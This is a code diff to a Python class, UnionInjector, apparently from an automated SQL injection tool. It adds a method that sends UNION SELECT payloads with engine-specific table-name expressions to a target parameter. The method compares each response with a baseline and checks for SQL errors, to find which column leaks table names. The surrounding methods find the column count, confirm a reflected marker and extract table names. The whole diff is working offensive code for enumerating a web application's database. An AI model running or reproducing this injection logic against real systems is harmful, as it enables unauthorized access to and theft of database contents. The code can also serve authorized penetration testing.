@@ -1,6 +1,12 @@
 from core.Analyzer import Analyzer
 from core.Requester import Requester
-from utils.constants import DIFF_MARKER, DIFFER_LENGTH_COL_COUNT, InjectionContext
+from utils.constants import (
+    DIFF_MARKER,
+    DIFFER_LENGTH_COL_COUNT,
+    DIFFER_LENGTH_COL_TYPE,
+    InjectionContext,
+    fingerprints,
+)
 
 
 class UnionInjector:
@@ -32,9 +38,7 @@ class UnionInjector:
         self.requester = requester
         self.analyzer = analyzer
 
-    def find_column_count(
-        self, param: str, ctx: InjectionContext
-    ) -> int | None:
+    def find_column_count(self, param: str, ctx: InjectionContext) -> int | None:
         """Find the number of columns expected by the SQL query."""
 
         # Get a baseline to which we will compare the other response bodies
@@ -73,9 +77,54 @@ class UnionInjector:
 
         return None
 
-    def test_marker(
-        self, param: str, ctx: InjectionContext, column_count
-    ) -> bool:
+    def get_nulls(
+        self, database_engine: str, param: str, ctx: InjectionContext, column_count: int
+    ) -> str:
+        """
+        Determine which UNION SELECT column can accept the database's table-name
+        expression without causing a SQL error.
+        """
+
+        # The engine-specific expression for the table name
+        table_name = fingerprints[database_engine.lower()].table_name
+
+        # A baseline response is first obtained using a UNION query containing NULL for all columns
+        payload = (
+            f"{ctx.prefix}UNION SELECT {','.join(['NULL'] * column_count)}{ctx.suffix}"
+        )
+        baseline = self.requester.send({param: payload})
+
+        original_nulls = []
+        for _ in range(column_count):
+            original_nulls.append("NULL")
+
+        nulls = original_nulls
+
+        # Each column is then tested individually by replacing its NULL value with the
+        # database-specific table-name expression while keeping the remaining columns as NULL.
+        for index in range(column_count):
+            expression = fingerprints[database_engine.lower()].table_name_expression
+            nulls[index] = table_name
+            nulls_str = ",".join(nulls)
+            expression_with_nulls = expression.format(columns=nulls_str)
+            payload = f"{ctx.prefix}{expression_with_nulls}{ctx.suffix}"
+
+            response = self.requester.send({param: payload})
+
+            # If the resulting response differs from the baseline and does not contain a
+            # SQL error, the tested column is considered compatible and the complete column
+            # expression is returned.
+            if self.analyzer.responses_differ(
+                response, baseline, DIFFER_LENGTH_COL_TYPE
+            ) and not self.analyzer.has_sql_error(response):
+                return nulls_str
+            nulls[index] = "NULL"
+
+        # Return comma-separated column expression containing the table-name
+        # expression in a compatible position and NULL elsewhere.
+        return ",".join(original_nulls)
+
+    def test_marker(self, param: str, ctx: InjectionContext, column_count) -> bool:
         """
         Check if the marker we inject in the SQL query is printed back
         in the response body. This would prove that the table names used in
@@ -83,9 +132,9 @@ class UnionInjector:
         """
 
         # Create a marker list matching the number of columns to make query compatible.
-        nulls = ",".join([DIFF_MARKER] * (column_count))
+        markers = ",".join([DIFF_MARKER] * (column_count))
 
-        payload = f"{ctx.prefix}UNION SELECT {nulls}{ctx.suffix}"
+        payload = f"{ctx.prefix}UNION SELECT {markers}{ctx.suffix}"
         # Logger.debug(payload)
 
         response = self.requester.send({param: payload})
@@ -98,7 +147,6 @@ class UnionInjector:
         param: str,
         ctx: InjectionContext,
         expression: str,
-        column_count: int,
     ) -> str | None:
         """
         Now that we know the injection works we will get the real table names
